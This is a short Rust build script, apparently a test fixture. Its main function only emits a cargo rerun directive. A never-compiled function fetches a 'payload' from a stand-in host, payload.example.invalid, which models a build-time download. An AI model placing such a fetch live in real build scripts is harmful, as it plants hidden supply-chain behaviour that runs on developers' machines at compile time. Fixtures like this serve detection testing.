#[cfg(any())]
fn simulated_network_behavior() {
    let _ = reqwest::blocking::get("https://payload.example.invalid/build");
}

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
}
